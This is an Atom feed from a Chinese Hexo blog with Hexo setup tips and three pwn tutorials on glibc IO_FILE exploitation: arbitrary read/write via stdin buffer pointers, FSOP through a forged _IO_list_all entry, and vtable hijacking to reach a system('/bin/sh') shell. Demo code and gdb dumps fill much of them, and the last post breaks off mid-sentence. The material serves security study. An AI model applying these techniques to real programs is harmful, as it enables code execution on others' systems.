<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>上善若水</title>
  <subtitle>古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-07-08T18:07:39.918Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Introspelliam</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>test3</title>
    <link href="http://yoursite.com/2018/07/09/test/test3/"/>
    <id>http://yoursite.com/2018/07/09/test/test3/</id>
    <published>2018-07-08T18:32:57.000Z</published>
    <updated>2018-07-08T18:07:39.918Z</updated>
    
    <content type="html"><![CDATA[<p>test3</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;test3&lt;/p&gt;

    
    </summary>
    
      <category term="test" scheme="http://yoursite.com/categories/test/"/>
    
    
      <category term="test1" scheme="http://yoursite.com/tags/test1/"/>
    
  </entry>
  
  <entry>
    <title>test2</title>
    <link href="http://yoursite.com/2018/07/09/test/test2/"/>
    <id>http://yoursite.com/2018/07/09/test/test2/</id>
    <published>2018-07-08T17:32:57.000Z</published>
    <updated>2018-07-08T18:07:31.189Z</updated>
    
    <content type="html"><![CDATA[<p>test2</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;test2&lt;/p&gt;

    
    </summary>
    
      <category term="test" scheme="http://yoursite.com/categories/test/"/>
    
    
      <category term="test1" scheme="http://yoursite.com/tags/test1/"/>
    
  </entry>
  
  <entry>
    <title>个人博客网站搭建中遇到的问题以及解决办法</title>
    <link href="http://yoursite.com/2018/07/09/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://yoursite.com/2018/07/09/个人博客网站搭建中遇到的问题以及解决办法/</id>
    <published>2018-07-08T17:10:05.000Z</published>
    <updated>2018-07-08T17:27:09.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-hexo-deploy卡死或报错"><a href="#1-hexo-deploy卡死或报错" class="headerlink" title="1. hexo deploy卡死或报错"></a>1. hexo deploy卡死或报错</h1><p>这是我最近遇到的问题，困扰了很长时间！</p>
<p>主要问题时因为hexo deploy中上传的内容比较大，而git push过程的是2B/s，直接导致最终上传不上去或者服务器返回超时或者ssl方面的错误。</p>
<p>解决办法：<a href="https://gist.github.com/laispace/666dd7b27e9116faece6" target="_blank" rel="external">挂代理</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git config --global https.proxy http://127.0.0.1:1080</div><div class="line">git config --global https.proxy https://127.0.0.1:1080</div><div class="line"></div><div class="line">git config --global --unset http.proxy</div><div class="line">git config --global --unset https.proxy</div><div class="line"></div><div class="line">npm config delete proxy</div></pre></td></tr></table></figure>
<h1 id="2-文章目录层级结构显示不全"><a href="#2-文章目录层级结构显示不全" class="headerlink" title="2. 文章目录层级结构显示不全"></a>2. 文章目录层级结构显示不全</h1><p>我们在使用侧边栏的时候，可能会有将文章目录结构全部显示的需求，但next/_config.yml不论如何设置都不会成功。这个时候就需要改源码。</p>
<p>next/source/css/_common/components/sidebar/sidebar-toc.styl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//.post-toc .nav .nav-child &#123; display: none; &#125;</div></pre></td></tr></table></figure>
<p>将上面那行注释掉即可</p>
<h1 id="3-文章目录自动无序列表"><a href="#3-文章目录自动无序列表" class="headerlink" title="3. 文章目录自动无序列表"></a>3. 文章目录自动无序列表</h1><p>当文章中没有1、2、3这样的章节标题设置时，我们很容易忽略层级关系；但是若加上1、2、3这样的章节标题，且next的toc设置中启用了自动添加数字时，就容易产生1.1.这样多次显示章节序列的问题。</p>
<p>解决办法：参考<a href="https://github.com/iissnan/hexo-theme-next/issues/857" target="_blank" rel="external">issue</a></p>
<p>next/_config.yml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># TOC in the Sidebar</div><div class="line">toc:</div><div class="line">  enable: true</div><div class="line"></div><div class="line">  # Automatically add list number to toc.</div><div class="line">  number: false</div></pre></td></tr></table></figure>
<p>将toc中的number设置为false</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-hexo-deploy卡死或报错&quot;&gt;&lt;a href=&quot;#1-hexo-deploy卡死或报错&quot; class=&quot;headerlink&quot; title=&quot;1. hexo deploy卡死或报错&quot;&gt;&lt;/a&gt;1. hexo deploy卡死或报错&lt;/h1&gt;&lt;p&gt;这是我最
    
    </summary>
    
      <category term="Hexo搭建博客网站" scheme="http://yoursite.com/categories/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
    
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>新版本libc下IO_FILE的利用</title>
    <link href="http://yoursite.com/2018/07/05/%E6%96%B0%E7%89%88%E6%9C%AClibc%E4%B8%8BIO-FILE%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2018/07/05/新版本libc下IO-FILE的利用/</id>
    <published>2018-07-05T03:03:51.000Z</published>
    <updated>2018-07-05T03:22:58.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="新版本libc下IO-FILE的利用"><a href="#新版本libc下IO-FILE的利用" class="headerlink" title="新版本libc下IO_FILE的利用"></a>新版本libc下IO_FILE的利用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在最新版本的glibc中(2.24)，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc 会在调用虚函数之前首先检查vtable地址的合法性。</p>
<p>如果vtable是非法的，那么会引发abort。</p>
<p>首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。</p>
<p>这里的检查使得以往使用vtable进行利用的技术很难实现</p>
<h2 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h2><p>在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。 前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE &#123;</div><div class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</div><div class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</div><div class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</div><div class="line">  char* _IO_read_ptr;   /* Current read pointer */</div><div class="line">  char* _IO_read_end;   /* End of get area. */</div><div class="line">  char* _IO_read_base;  /* Start of putback+get area. */</div><div class="line">  char* _IO_write_base; /* Start of put area. */</div><div class="line">  char* _IO_write_ptr;  /* Current put pointer. */</div><div class="line">  char* _IO_write_end;  /* End of put area. */</div><div class="line">  char* _IO_buf_base;   /* Start of reserve area. */</div><div class="line">  char* _IO_buf_end;    /* End of reserve area. */</div><div class="line">  /* The following fields are used to support backing up and undo. */</div><div class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</div><div class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</div><div class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</div><div class="line"></div><div class="line">  struct _IO_marker *_markers;</div><div class="line"></div><div class="line">  struct _IO_FILE *_chain;</div><div class="line"></div><div class="line">  int _fileno;</div><div class="line">  int _flags2;</div><div class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用。</p>
<p>在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>简单的观察一下_IO_FILE对于调用scanf的作用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">char buf[100];</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line"> char stack_buf[100];</div><div class="line"> scanf(&quot;%s&quot;,stack_buf);</div><div class="line"> scanf(&quot;%s&quot;,stack_buf);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在执行程序第一次使用stdin之前，stdin的内容还未初始化是空的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;== vtable</div></pre></td></tr></table></figure>
<p>调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</div></pre></td></tr></table></figure>
<p>进一步思考可以发现其实stdin初始化的内存是在堆上分配出来的，在这里堆的基址是0x602000，因为之前没有堆分配因此缓冲区的地址也是0x602010</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Start              End                Offset             Perm Path</div><div class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</div></pre></td></tr></table></figure>
<p>分配的堆大小是0x400个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x602000:   0x0000000000000000  0x0000000000000411 &lt;== 分配0x400大小</div><div class="line">0x602010:   0x000000000a333231  0x0000000000000000 &lt;== 缓冲数据</div><div class="line">0x602020:   0x0000000000000000  0x0000000000000000</div><div class="line">0x602030:   0x0000000000000000  0x0000000000000000</div><div class="line">0x602040:   0x0000000000000000  0x0000000000000000</div></pre></td></tr></table></figure>
<p>接下来我们尝试修改_IO_buf_base来实现任意地址读写，全局缓冲区buf的地址是0x7ffff7dd2740。修改_IO_buf_base和_IO_buf_end到缓冲区buf的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x00007ffff7dd2740 &lt;== _IO_buf_base</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;== _IO_buf_end</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</div></pre></td></tr></table></figure>
<p>之后scanf的读入数据就会写入到0x7ffff7dd2740的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000</div><div class="line">0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;新版本libc下IO-FILE的利用&quot;&gt;&lt;a href=&quot;#新版本libc下IO-FILE的利用&quot; class=&quot;headerlink&quot; title=&quot;新版本libc下IO_FILE的利用&quot;&gt;&lt;/a&gt;新版本libc下IO_FILE的利用&lt;/h1&gt;&lt;h2 id=&quot;介
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="IO_FILE" scheme="http://yoursite.com/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>FSOP</title>
    <link href="http://yoursite.com/2018/07/05/FSOP/"/>
    <id>http://yoursite.com/2018/07/05/FSOP/</id>
    <published>2018-07-05T02:51:47.000Z</published>
    <updated>2018-07-05T02:55:31.341Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。</p>
<p>FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">_IO_flush_all_lockp (int do_lock)</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  fp = (_IO_FILE *) _IO_list_all;</div><div class="line">  while (fp != NULL)</div><div class="line">  &#123;</div><div class="line">       ...</div><div class="line">       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</div><div class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</div><div class="line">           &#123;</div><div class="line">               result = EOF;</div><div class="line">          &#125;</div><div class="line">        ...</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/2018-07-05/abort_routine.001.jpeg" alt="img"></p>
<p>而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
<p>1.当libc执行abort流程时</p>
<p>2.当执行exit函数时</p>
<p>3.当执行流从main函数返回时</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>梳理一下FSOP利用的条件，首先需要攻击者获知libc.so基址，因为_IO_list_all是作为全局变量储存在libc.so中的，不泄漏libc基址就不能改写_IO_list_all。</p>
<p>之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，</p>
<p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的vtable指针。但是为了能够让我们构造的fake_FILE能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</div><div class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</div><div class="line">           &#123;</div><div class="line">               result = EOF;</div><div class="line">          &#125;</div></pre></td></tr></table></figure>
<p>也就是</p>
<ul>
<li>fp-&gt;_mode &lt;= 0</li>
<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
</ul>
<p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的vtable和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode等数据域的偏移，这样可以在伪造的vtable中构造相应的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#define _IO_list_all 0x7ffff7dd2520</div><div class="line">#define mode_offset 0xc0</div><div class="line">#define writeptr_offset 0x28</div><div class="line">#define writebase_offset 0x20</div><div class="line">#define vtable_offset 0xd8</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    void *ptr;</div><div class="line">    long long *list_all_ptr;</div><div class="line"></div><div class="line">    ptr=malloc(0x200);</div><div class="line"></div><div class="line">    *(long long*)((long long)ptr+mode_offset)=0x0;</div><div class="line">    *(long long*)((long long)ptr+writeptr_offset)=0x1;</div><div class="line">    *(long long*)((long long)ptr+writebase_offset)=0x0;</div><div class="line">    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);</div><div class="line"></div><div class="line">    *(long long*)((long long)ptr+0x100+24)=0x41414141;</div><div class="line"></div><div class="line">    list_all_ptr=(long long *)_IO_list_all;</div><div class="line"></div><div class="line">    list_all_ptr[0]=ptr;</div><div class="line"></div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用分配内存的前0x100个字节作为_IO_FILE_plus，后0x100个字节作为vtable，在vtable中使用0x41414141这个地址作为伪造的_IO_overflow指针。</p>
<p>之后，覆盖位于libc中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。</p>
<p>通过调用exit函数，程序会执行 _IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---&gt; call _IO_overflow</div><div class="line">[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)</div><div class="line">[#1] 0x7ffff7a8932a → Name: _IO_cleanup()</div><div class="line">[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)</div><div class="line">[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)</div><div class="line">[#4] 0x4005ce → Name: main()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="IO_FILE" scheme="http://yoursite.com/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>伪造vtable劫持程序流程</title>
    <link href="http://yoursite.com/2018/07/05/%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/07/05/伪造vtable劫持程序流程/</id>
    <published>2018-07-05T01:24:28.000Z</published>
    <updated>2018-07-05T02:51:02.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>前面我们介绍了Linux中文件流的特性（FILE），我们可以得知Linux中的一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。</p>
<p>因此伪造vtable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。</p>
<p>因此vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改vtable中的指针，首先需要知道_IO_FILE_plus位于哪里，对于fopen的情况下是位于堆内存，对于stdin\stdout\stderr是位于libc.so中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">void getshell()&#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_ptr;</div><div class="line">    mprotect(0x00007ffff7dcd000, 0x4000, 7);   // set IO_FILE rwx</div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</div><div class="line"></div><div class="line">    vtable_ptr[7]=0x400606; //xsputn</div><div class="line"></div><div class="line">    printf(&quot;call 0x400606&quot;); //getshell</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>根据vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系统下偏移是0xd8。之后需要搞清楚欲劫持的IO函数会调用vtable中的哪个函数。关于IO函数调用vtable的情况已经在FILE结构介绍一节给出了，知道了printf会调用vtable中的xsputn，并且xsputn的是vtable中第八项之后就可以写入这个指针进行劫持。</p>
<p>并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。</p>
<p>利用这点可以实现给劫持的vtable函数传參，比如</p>
